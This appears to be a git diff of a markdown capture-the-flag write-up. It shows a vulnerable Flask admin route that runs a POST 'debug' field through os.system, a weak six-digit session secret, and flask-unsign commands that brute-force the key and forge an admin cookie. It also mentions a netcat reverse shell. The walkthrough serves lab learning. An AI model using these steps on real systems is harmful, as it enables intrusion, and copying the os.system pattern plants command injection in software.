@@ -22,56 +22,56 @@ A fun room, with *seven* flags, each representing a different stage of the compr
 
 6. The **third flag** was in this source file. The source code revealed the site's structure, including showing some of the rabbit holes. Notably it also showed that /admin could only be accessed if the username was 'admin', and that this would provide a means to get code execution:
 
-  ```python
-  @app.route("/admin", methods=["GET", "POST"])
-  def admin():
-        if not session.get("logged_in"):
-                return redirect("/login")
-        else:
-                if session.get("username") == "admin":
-
-                        if request.method == "POST":
-                                os.system(request.form["debug"])
-                                return render_template("admin.html")
-
-                        current_ip = request.remote_addr
-                        current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
-
-                        return render_template("admin.html", current_ip=current_ip, current_time=current_time)
-                else:
-                        return abort(403)
-  ```
+    ```python
+    @app.route("/admin", methods=["GET", "POST"])
+    def admin():
+          if not session.get("logged_in"):
+                  return redirect("/login")
+          else:
+                  if session.get("username") == "admin":
   
-  However, it was impossible to login as admin:
+                          if request.method == "POST":
+                                  os.system(request.form["debug"])
+                                  return render_template("admin.html")
   
-  ```python
-  if username.lower() == "admin@securesolacoders.no":
-      error = "Invalid password"
-      return render_template("login.html", error=error)
-  ```
+                          current_ip = request.remote_addr
+                          current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
   
-  But, the session key used for the flask cookie was potentially very weak:
-
-  ```python
-  key = "secret_key_"   str(random.randrange(100000,999999))
-  app.secret_key = str(key).encode()
-  ```
+                          return render_template("admin.html", current_ip=current_ip, current_time=current_time)
+                  else:
+                          return abort(403)
+    ```
+    
+    However, it was impossible to login as admin:
+    
+    ```python
+    if username.lower() == "admin@securesolacoders.no":
+        error = "Invalid password"
+        return render_template("login.html", error=error)
+    ```
+    
+    But, the session key used for the flask cookie was potentially very weak:
   
-  And a quick look at the key (base64 decode it) revealed its format was:
-
-  ```
-  {'logged_in': True, 'username': 'anders'}
-  ```
-
-  So if I could brute force the key to resign a cookie changing my username, I could proceed.
+    ```python
+    key = "secret_key_"   str(random.randrange(100000,999999))
+    app.secret_key = str(key).encode()
+    ```
+    
+    And a quick look at the key (base64 decode it) revealed its format was:
+  
+    ```
+    {'logged_in': True, 'username': 'anders'}
+    ```
+  
+    So if I could brute force the key to resign a cookie changing my username, I could proceed.
   
 7. I did this with a tool named [flask-unsign](https://pypi.org/project/flask-unsign/) over several steps:
 
-  a. First I generated a wordlist with bash: `for i in {100000..999999}; do echo secret_key_$i >> wordlist.txt; done`
-  b. Next I bruted out the secret key with `flask-unsign -c [session_key] -u --wordlist=wordlist.txt`
-  c. Finally I created a new key with `flask-unsign -c "{'logged_in': True, 'username': 'admin'}" -s -S [discovered_secret]`
+    1. First I generated a wordlist with bash: `for i in {100000..999999}; do echo secret_key_$i >> wordlist.txt; done`
+    2. Next I bruted out the secret key with `flask-unsign -c [session_key] -u --wordlist=wordlist.txt`
+    3. Finally I created a new key with `flask-unsign -c "{'logged_in': True, 'username': 'admin'}" -s -S [discovered_secret]`
   
-  This allowed me access to the admin section.
+    This allowed me access to the admin section.
   
 8. The **fourth and final web flag** was on the admin page. As shown in the code above, any payload passed as 'debug=[command]' in a POST request would be executed, but not reflected. I used a simple openbsd netcat payload to get a rev shell.
 
